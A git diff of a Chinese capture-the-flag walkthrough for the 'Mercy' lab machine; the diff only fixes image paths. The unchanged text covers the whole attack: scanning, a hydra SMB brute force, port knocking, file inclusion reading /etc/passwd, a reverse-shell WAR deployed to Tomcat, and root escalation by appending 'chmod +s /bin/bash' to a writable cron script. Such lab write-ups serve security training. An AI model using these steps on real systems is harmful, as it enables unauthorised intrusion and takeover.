@@ -16,7 +16,7 @@
 
 也可以使用`nmap`等工具进行
 
-![](pic-mercy\1.jpg)
+![](./pic-mercy/1.jpg)
 
 # 信息收集
 
@@ -28,7 +28,7 @@
 nmap -sT 192.168.10.11 --min-rate=1000 -p- -oA nmap-tcp
 ```
 
-![](pic-mercy\2.jpg)
+![](./pic-mercy/2.jpg)
 
 
 
@@ -38,7 +38,7 @@ nmap -sT 192.168.10.11 --min-rate=1000 -p- -oA nmap-tcp
 nmap -sU 192.168.10.11 --top-ports 20 -T4 -oA nmap-udp
 ```
 
-![](pic-mercy\3.jpg)
+![](./pic-mercy/3.jpg)
 
 把前面扫描出的`tcp、udp`端口，进行处理，只取端口号
 
@@ -49,7 +49,7 @@ grep open nmap-udp.nmap | grep -v "open|filtered" | awk -F'/' '{print $1}' | pas
 ports=53,110,139,143,445,993,995,8080,123,137
 ```
 
-![](pic-mercy\4.jpg)
+![](./pic-mercy/4.jpg)
 
 对特定的端口号进行深入探测
 
@@ -57,11 +57,11 @@ ports=53,110,139,143,445,993,995,8080,123,137
 nmap -sV -O -sC -sT 192.168.10.11 -p $ports -oA detail
 ```
 
-![](pic-mercy\5.jpg)
+![](./pic-mercy/5.jpg)
 
-![6](pic-mercy\6.jpg)
+![6](./pic-mercy/6.jpg)
 
-![7](pic-mercy\7.jpg)
+![7](./pic-mercy/7.jpg)
 
 对特定的端口号进行漏洞检测，前面端口的检测，基本上都是在中间人攻击时，数据传输的问题
 
@@ -71,7 +71,7 @@ nmap -sV -O -sC -sT 192.168.10.11 -p $ports -oA detail
 nmap --script=vuln 192.168.10.11 -p $ports -oA vuln
 ```
 
-![](pic-mercy\8.jpg)
+![](./pic-mercy/8.jpg)
 
 
 
@@ -81,15 +81,15 @@ nmap --script=vuln 192.168.10.11 -p $ports -oA vuln
 
 访问8080端口的界面，查看页面源代码，无信息暴露，不过在文章最后提到两个地址，是可以访问的，不过需要认证，也就是登录
 
-![](pic-mercy\9.jpg)
+![](./pic-mercy/9.jpg)
 
 访问`manager`界面
 
-![](pic-mercy\10.jpg)
+![](./pic-mercy/10.jpg)
 
 访问`host-manager`界面
 
-![](pic-mercy\11.jpg)
+![](./pic-mercy/11.jpg)
 
 使用`gobuster`进行目录爆破，也可以使用其他工具，如`dirb、dirsearch`等
 
@@ -97,17 +97,17 @@ nmap --script=vuln 192.168.10.11 -p $ports -oA vuln
 gobuster dir -u http://192.168.10.11:8080 -w /usr/share/wordlists/dirb/big.txt -x php,bak,txt,js,html -b 403-404
 ```
 
-![](pic-mercy\12.jpg)
+![](./pic-mercy/12.jpg)
 
 与之前使用`nmap`脚本时，枚举的差不多，这里主要就是`robots.txt`文件
 
 访问`robots.txt`文件，发现一个路径
 
-![](pic-mercy\13.jpg)
+![](./pic-mercy/13.jpg)
 
 访问`/tryharder/tryharder`，发现是某种编码处理后的数据
 
-![](pic-mercy\14.jpg)
+![](./pic-mercy/14.jpg)
 
 根据特性，可能是`base64`编码，使用命令进行解码处理
 
@@ -115,7 +115,7 @@ gobuster dir -u http://192.168.10.11:8080 -w /usr/share/wordlists/dirb/big.txt -
 echo 'SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==' | base64 -d 
 ```
 
-![](pic-mercy\15.jpg)
+![](./pic-mercy/15.jpg)
 
 这里可以看到，解码后是一段内容，主要就是弱密码的问题，这里提示`password`，就是弱密码了
 
@@ -129,9 +129,9 @@ echo 'SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IG
 enum4linux -a 192.168.10.11
 ```
 
-![](pic-mercy\16.jpg)
+![](./pic-mercy/16.jpg)
 
-![17](pic-mercy\17.jpg)
+![17](./pic-mercy/17.jpg)
 
 使用`nmap`的脚本进行探测
 
@@ -139,9 +139,9 @@ enum4linux -a 192.168.10.11
 nmap --script=smb* 192.168.10.11
 ```
 
-![](pic-mercy\18.jpg)
+![](./pic-mercy/18.jpg)
 
-![](pic-mercy\19.jpg)
+![](./pic-mercy/19.jpg)
 
 根据已知信息，进行汇集
 
@@ -159,7 +159,7 @@ nmap --script=smb* 192.168.10.11
 hydra -L user -P /usr/share/wordlists/fasttrack.txt -e nsr 192.168.10.11 smb
 ```
 
-![](pic-mercy\20.jpg)
+![](./pic-mercy/20.jpg)
 
 这里可以看到，爆破出的密码和给出的密码是一样的，都是`password`
 
@@ -169,7 +169,7 @@ hydra -L user -P /usr/share/wordlists/fasttrack.txt -e nsr 192.168.10.11 smb
 smbclient //192.168.10.11/qiu -U qiu
 ```
 
-![](pic-mercy\21.jpg)
+![](./pic-mercy/21.jpg)
 
 把所有内容下载到`kali`中
 
@@ -179,15 +179,15 @@ recurce		#开启递归，把文件夹中的文件也会下载
 mget *		#下载所有内容
 ```
 
-![](pic-mercy\22.jpg)
+![](./pic-mercy/22.jpg)
 
-![23](pic-mercy\23.jpg)
+![23](./pic-mercy/23.jpg)
 
 查看所有文件，寻找有无可用信息
 
 访问`.private`目录时，发现有信息，这里可能有东西
 
-![](pic-mercy\24.jpg)
+![](./pic-mercy/24.jpg)
 
 # 关键配置文件泄露
 
@@ -195,7 +195,7 @@ mget *		#下载所有内容
 
 首先就是端口的开启与关闭，采用开门的形式，这里是对`http`80端口和`ssh`22端口的配置
 
-![](pic-mercy\25.jpg)
+![](./pic-mercy/25.jpg)
 
 先开启吧，这里可以使用`knock`或`nc`按照序列即可开启端口
 
@@ -205,7 +205,7 @@ nc 192.168.10.11 27391
 nc 192.168.10.11 4
 ```
 
-![](pic-mercy\26.jpg)
+![](./pic-mercy/26.jpg)
 
 再开启`22`端口，一定要按照序列的顺序
 
@@ -213,25 +213,25 @@ nc 192.168.10.11 4
 knock 192.168.10.11 17301 28504 9999
 ```
 
-![](pic-mercy\27.jpg)
+![](./pic-mercy/27.jpg)
 
 后面的配置信息都是`apache2`和`smb`的一些信息，并未透露什么敏感信息
 
 那么访问80端口，只有这个信息，并且查看页面源代码也没有信息
 
-![](pic-mercy\28.jpg)
+![](./pic-mercy/28.jpg)
 
 和前面的`8080`端口网站一样，访问`robots.txt`文件试试有没有
 
-![](pic-mercy\29.jpg)
+![](./pic-mercy/29.jpg)
 
 发现两个路径`/mercy、nomercy`，访问`mercy`，发现是一段话，并且可能无用
 
-![](pic-mercy\30.jpg)
+![](./pic-mercy/30.jpg)
 
 访问`nomercy`，这可能是一个`cms`，并且在测试时，点击按钮无反应，并且界面中显示出了可能是`cms`的名称和版本信息
 
-![](pic-mercy\31.jpg)
+![](./pic-mercy/31.jpg)
 
 使用`whatweb`进行探测，确实如此
 
@@ -239,17 +239,17 @@ knock 192.168.10.11 17301 28504 9999
 whatweb http://192.168.10.11/nomercy
 ```
 
-![](pic-mercy\32.jpg)
+![](./pic-mercy/32.jpg)
 
 # 漏洞利用
 
 使用`searchsploit`搜索有无漏洞可利用，有一个
 
-![](pic-mercy\33.jpg)
+![](./pic-mercy/33.jpg)
 
 查看这个文档，两个可能，不过看来都像是文件包含
 
-![](pic-mercy\34.jpg)
+![](./pic-mercy/34.jpg)
 
 一个个的测试，先测试`/windows/code.php`
 
@@ -257,7 +257,7 @@ whatweb http://192.168.10.11/nomercy
 http://192.168.10.11/nomercy/windows/code.php?file=../../../../../../etc/passwd
 ```
 
-![](pic-mercy\35.jpg)
+![](./pic-mercy/35.jpg)
 
 这个也行，但是显示结果只有一行
 
@@ -265,7 +265,7 @@ http://192.168.10.11/nomercy/windows/code.php?file=../../../../../../etc/passwd
 http://192.168.10.11/nomercy/windows/function.php?file=../../../../../../etc/passwd
 ```
 
-![](pic-mercy\36.jpg)
+![](./pic-mercy/36.jpg)
 
 尝试进行远程文件包含测试，发现并不行，虽然远程文件是包含了，但是作为`php`相当于没有被解析
 
@@ -275,7 +275,7 @@ http://192.168.10.11/nomercy/windows/function.php?file=../../../../../../etc/pas
 
 直接包含这个文件进行查看，获取两组，不过从配置来看`thisisasuperduperlonguser`权限更大
 
-![](pic-mercy\37.jpg)
+![](./pic-mercy/37.jpg)
 
 | 用户名                    | 密码                   |
 | ------------------------- | ---------------------- |
@@ -286,7 +286,7 @@ http://192.168.10.11/nomercy/windows/function.php?file=../../../../../../etc/pas
 
 登录后，发现有部署`war`文件，那么就需要测试
 
-![](pic-mercy\38.jpg)
+![](./pic-mercy/38.jpg)
 
 使用`msfenvm`生成一个脚本
 
@@ -302,17 +302,17 @@ nc -lvnp 9999
 
 然后部署后，点击部署的名称`shell`，即可获取到反弹`shell`
 
-![](pic-mercy\40.jpg)
+![](./pic-mercy/40.jpg)
 
 # 水平提权
 
 在这里折腾了一会，就没截图，直接切换`fluffy`用户，所用的密码就是在`tomcat`的配置文件中发现的两组用户，为什么能切换，首先就是确认了系统中有这个用户，然后就是测试是否存在一个密码多用的情况
 
-![](pic-mercy\41.jpg)
+![](./pic-mercy/41.jpg)
 
 在`fluffy`的家目录下的一个文件夹中，发现一个疑似定时任务的脚本，所属者为`root`，并且这个文件别人是可以修改的
 
-![](pic-mercy\42.jpg)
+![](./pic-mercy/42.jpg)
 
 就先添加一句，因为目前不确定
 
@@ -330,7 +330,7 @@ cat /etc/issue
 cat /etc/*release
 ```
 
-![](pic-mercy\43.jpg)
+![](./pic-mercy/43.jpg)
 
 查看网络连接状态
 
@@ -339,7 +339,7 @@ ip add
 ss -antlp
 ```
 
-![](pic-mercy\44.jpg)
+![](./pic-mercy/44.jpg)
 
 查看以`root`执行的进程
 
@@ -347,13 +347,13 @@ ss -antlp
 ps aux | grep root
 ```
 
-![](pic-mercy\45.jpg)
+![](./pic-mercy/45.jpg)
 
 上传`pspy64`脚本，发现无法执行，上传`les.sh`脚本，发现几个可能性高的漏洞
 
-![](pic-mercy\46.jpg)
+![](./pic-mercy/46.jpg)
 
-![](pic-mercy\47.jpg)
+![](./pic-mercy/47.jpg)
 
 但是因为靶机内没有`gcc`或`cc`，所以我测试前面可能性较高的都无法执行后，就放弃了
 
@@ -363,7 +363,7 @@ ps aux | grep root
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-![](pic-mercy\48.jpg)
+![](./pic-mercy/48.jpg)
 
 # 垂直提权至root
 
@@ -381,7 +381,7 @@ echo "chmod +s /bin/bash" >> timeclock
 /bin/bash -p
 ```
 
-![](pic-mercy\49.jpg)
+![](./pic-mercy/49.jpg)
 
 # 总结
 
